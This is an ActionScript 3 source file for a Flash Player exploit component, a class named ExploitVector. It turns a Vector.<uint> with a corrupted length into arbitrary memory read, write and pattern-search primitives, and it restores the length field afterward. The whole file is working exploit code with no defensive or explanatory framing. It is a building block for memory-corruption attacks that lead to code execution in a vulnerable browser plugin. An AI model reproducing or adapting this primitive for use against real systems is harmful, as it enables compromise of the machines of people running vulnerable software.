package
{
    public class ExploitVector
    {
        private var uv:Vector.<uint>
        public var original_length:uint = 1014 
        
        public function ExploitVector(v:Vector.<uint>)
        {
            uv = v
        }

        public function restore():void
        {
            uv[0x3ffffffe] = original_length
        }

        public function is_ready():Boolean
        {
            if (uv.length > original_length) 
            {
                return true
            }
            return false
        } 
        
        public function at(pos:uint):uint
        {
            return uv[pos]
        }

        // pos: position where a Vector.<Object>[0] lives
        public function set_own_address(pos:uint):void
        {
            uv[0] = uv[pos - 5] - ((pos - 5) * 4) - 0xc
        }

        public function read(addr:uint):uint
        {
            var pos:uint = 0

            if (addr > uv[0]) {
                pos = ((addr - uv[0]) / 4) - 2
            } else {
                pos = ((0xffffffff - (uv[0] - addr)) / 4) - 1
            }

            return uv[pos]
        }

        public function write(addr:uint, value:uint = 0):void
        {           
            var pos:uint = 0

            if (addr > uv[0]) {
                pos = ((addr - uv[0]) / 4) - 2
            } else {
                pos = ((0xffffffff - (uv[0] - addr)) / 4) - 1
            }

            uv[pos] = value
        }

        public function search_pattern(pattern:uint, limit:uint):uint
        {
            for (var i:uint = 0; i < limit/4; i++) {
                if (uv[i] == pattern) {
                    return i
                }
            }
            throw new Error() 
        }
    }
}